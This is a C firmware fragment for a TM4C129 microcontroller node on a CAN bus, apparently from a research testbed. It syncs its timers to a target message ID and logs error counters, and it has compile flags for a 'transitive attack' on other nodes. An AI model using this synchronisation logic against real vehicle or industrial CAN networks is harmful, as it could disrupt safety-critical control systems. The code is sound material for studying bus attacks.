Ipsitakoley/tm4c129-canbus/synth-benchmark/node-c.c
#if defined(SYNC_0PHASE)
        TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
        //IntEnable(INT_TIMER1A);
        //TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
        ROM_TimerEnable(TIMER1_BASE, TIMER_A);
#endif

    g_target_id = TARGET_ID;

    //
    // Loop forever while the timers run.
    //
    while(1)
    {
        if( g_tick == true ) {
            g_tick = false;

            send_messages(++count);
        }

        if (g_bTXFlag) {

            CANErrCntrGet(CAN0_BASE, &rec, &tec);
            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
            g_bTXFlag = false;

#if defined(TRANSITIVE_ATTACK)
            g_target_id = 0x09;
            g_sync = 4;
            g_skip_attack = 2;
#endif
        }

        //
        // If the flag is set, that means that the RX interrupt occurred and
        // there is a message ready to be read from the CAN
        //
        if(g_bRXFlag)
        {
            //
            // Reuse the same message object that was used earlier to configure
            // the CAN for receiving messages.  A buffer for storing the
            // received data must also be provided, so set the buffer pointer
            // within the message object.
            //
            g_sCAN0RxMessage.pui8MsgData = (uint8_t *) &g_ui8RXMsgData;

            //
            // Read the message from the CAN.  Message object RXOBJECT is used
            // (which is not the same thing as CAN ID).  The interrupt clearing
            // flag is not set because this interrupt was already cleared in
            // the interrupt handler.
            //
            CANMessageGet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, 0);


            //
            // Clear the pending message flag so that the interrupt handler can
            // set it again when the next message arrives.
            //
            g_bRXFlag = 0;

            //
            // Check to see if there is an indication that some messages were
            // lost.
            //
            if(g_sCAN0RxMessage.ui32Flags & MSG_OBJ_DATA_LOST)
            {
            //    UARTprintf("\nCAN message loss detected\n");
            }

#if defined(DISABLE_ABORT_RX_PRECEDED)
            if (g_sCAN0RxMessage.ui32MsgID == PRECEDED_ID ) {
                volatile int delay = 0;
                for (delay = 0; delay < 500; delay++); /* FIXME: Fudge factor. */
                CANMessageClear(CAN0_BASE, TXOBJECT_5);
            }
#endif

            if (g_sCAN0RxMessage.ui32MsgID == g_target_id) {
#if defined(SYNC_0PHASE)
                if (g_sync != 1) {
                    if (g_sync > 3) g_sync--;
                    //else if ( g_msg_since_idle < g_sync_since_idle ) {
                        else if ( g_msg_since_idle < 4 ) {
                            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
                            //g_sync_since_idle = 1;
                            count = 0;
                            g_sync = 2;
                    }
                }
#elif defined(SYNC_PERIOD)
                if (g_sync != 1) {
                    if (g_sync > 3) g_sync--;
                    else {
                        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
                        count = 0;
                        g_sync = 2;
                    }
                }
#endif /* SYNC */

#if defined(VERBOSE)
                CANErrCntrGet(CAN0_BASE, &rec, &tec);
                UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
#endif

            } else if (g_sCAN0RxMessage.ui32MsgID == 0xff) {
                UARTprintf("%d\tRESET\n", count);
                g_sync = 4;
                g_sync_since_idle = 255;
                g_msg_since_idle = 0;
                g_reset = 0;
                count = 0;
                g_target_id = TARGET_ID;
                g_skip_attack = SKIP_ATTACK;
                ResetCAN0();
                TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
                ROM_TimerEnable(TIMER1_BASE, TIMER_A);
            }

            //
            // Print the received character to the UART terminal
            //
//            UARTprintf("%c", g_ui8RXMsgData);

        }
        if (g_ui32ErrFlag) {
            CANErrorHandler();
        }
    }
}
